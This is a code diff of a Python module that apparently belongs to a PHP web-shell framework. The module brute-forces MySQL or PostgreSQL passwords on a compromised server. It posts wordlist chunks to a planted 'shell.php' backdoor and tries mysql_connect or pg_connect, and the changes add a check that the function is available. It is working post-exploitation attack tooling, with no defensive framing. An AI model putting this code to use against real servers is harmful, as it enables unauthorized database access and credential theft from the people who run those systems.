@@ -50,13 +50,8 @@ break;
         
     def run_module( self, mode, user, filename, start_line, host):
 
-        if mode == 'mysql':
-            sql_connect = "mysql_connect"
-        elif mode == 'postgres':
-            sql_connect = "pg_connect"
-        else:
-            raise ModuleException(self.name,  "Database '%s' unsupported" % (mode))
 
+        
         if start_line == 'all':
             start_line = 0
 
@@ -83,19 +78,30 @@ break;
             vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
         
         for vector in vectors:
-            response = self.__execute_payload(vector, [sql_connect, host, user, rand_post_name, start_line, wl_splitted])
+            response = self.__execute_payload(vector, [mode, host, user, rand_post_name, start_line, wl_splitted])
             if response != None:
                 self.params.set_and_check_parameters({'vector' : vector.name})
                 return response
+        
                 
         
     def __execute_payload(self, vector, parameters):
-        
+
+        if parameters[0] == 'mysql':
+            parameters[0] = "mysql_connect"
+        else:
+            parameters[0] = "pg_connect"
+
+
         rand_post_name = parameters[3]
         start_line = int(parameters[4])
         wl = parameters[5][start_line:]
         
         chunks = int(ceil(len(wl)/self.chunksize))
+        
+        if self.modhandler.load('shell.php').run({0 : "if(function_exists('%s')) echo(1);" % parameters[0]}) != '1':
+            self.mprint('[%s] Skipping vector %s: %s not available' % (self.name, vector.name, parameters[0]))
+            return
         
         if len(wl) > self.chunksize:
             self.mprint('[%s] Splitting wordlist of %i words in %i chunks of %i words.' % (self.name, len(wl), chunks+1, self.chunksize))
@@ -112,8 +118,8 @@ break;
             joined_wl='\n'.join(wl[startword:endword])
         
             payload = self.__prepare_payload(vector, parameters[:-2]) 
-            if vector.interpreter == 'shell.php':
-                self.modhandler.load(vector.interpreter).set_post_data({rand_post_name : joined_wl})
+            
+            self.modhandler.load(vector.interpreter).set_post_data({rand_post_name : joined_wl})
             response = self.modhandler.load(vector.interpreter).run({ 0 : payload})
             
             if response:
@@ -122,6 +128,7 @@ break;
             else:
                 self.mprint("Try #%i: (%s:%s) ..." % (endword+start_line, parameters[2], wl[endword-1]))
 
+        self.mprint('[%s] Password not found. Check mysql connection, username or get a bigger wordlist.' % self.name);
 
     def __prepare_payload( self, vector, parameters ):
 
